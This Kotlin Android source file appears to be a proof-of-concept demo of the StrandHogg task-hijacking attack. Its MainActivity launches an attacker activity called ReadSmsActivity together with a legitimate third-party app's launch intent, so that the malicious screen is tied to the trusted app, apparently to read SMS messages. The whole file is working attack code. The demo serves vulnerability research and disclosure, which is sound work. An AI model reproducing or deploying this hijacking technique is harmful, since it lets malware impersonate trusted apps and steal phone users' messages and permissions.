package io.kamara.android.strandhogg.demo

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity()  {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        launcherButton.setOnClickListener { launchDoubleActivitiesAttack() }
    }

    private fun launchDoubleActivitiesAttack() {
        val activities = arrayListOf<Intent>()

        val attackerIntent = Intent(this, ReadSmsActivity::class.java)
        attackerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        attackerIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)

        activities.add(attackerIntent)

        val packageName = getString(R.string.third_part_app_pkg_name)
        val benignIntent = packageManager.getLaunchIntentForPackage(packageName)
        benignIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        benignIntent?.let { activities.add(it) }

        startActivities(activities.toTypedArray())
    }

}
